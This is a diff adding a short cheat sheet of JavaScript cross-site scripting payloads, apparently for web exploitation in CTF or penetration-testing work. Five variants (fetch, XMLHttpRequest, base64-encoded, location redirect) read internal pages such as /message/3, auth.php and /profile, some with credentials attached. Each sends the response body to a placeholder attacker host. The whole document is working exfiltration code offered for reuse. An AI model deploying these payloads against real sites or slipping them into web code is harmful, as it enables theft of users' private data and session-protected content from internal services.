@@ -1,0 +1,84 @@
+Quick fetch
+
+fetch("http://127.0.0.1:80/message/3").then((r) => {
+    return r.text();
+}).then((x) => {
+    fetch("http://<attacker>:80/lol="+x, {
+        "headers": {
+            "content-type": "application/json"
+        },
+        "body": x,
+        "method": "POST",
+        "mode": "cors",
+        "credentials": "omit"
+    });
+});
+
+====
+
+Using Ajax
+
+<script>
+var url = "http://127.0.0.1/auth.php";
+var blah = "http://<attacker ip>/lol";
+var xhr  = new XMLHttpRequest();
+xhr.onreadystatechange = function() {
+    if (xhr.readyState == XMLHttpRequest.DONE) {
+        fetch(blah + "?" + xhr.responseText);
+    }
+}
+xhr.open('POST', url, true);
+xhr.send('email=1&password=2');
+</script>
+
+===
+
+Or Encoded
+
+<script>
+var url = "http://127.0.0.1/index.php";
+var attacker = "http://<attacker ip>/lol";
+fetch(attacker + "?test");
+var xhr  = new XMLHttpRequest();
+xhr.onreadystatechange = function() {
+    if (xhr.readyState == XMLHttpRequest.DONE) {
+        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)));
+	  //fetch(attacker + "?" + xhr.responseText);
+    }
+}
+xhr.open('GET', url, true);
+xhr.withCredentials = true;
+xhr.send(null);
+</script>
+
+===
+
+Alternative (simple)
+
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open("GET", "http://127.0.0.1/profile", true);
+req.withCredentials = true;
+req.send();
+
+
+function reqListener() {
+location='http://<attakcer ip>/lol?'+this.responseText;
+};
+
+===
+
+Alternative (other)
+
+var url = "http://127.0.0.1/profile";
+var attacker = "http://<attakcer-ip>/lol";
+var xhr  = new XMLHttpRequest();
+xhr.onreadystatechange = function() {
+
+    if (xhr.readyState == XMLHttpRequest.DONE) {
+        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
+    }
+}
+
+xhr.open('GET', url, true);
+xhr.send(null);
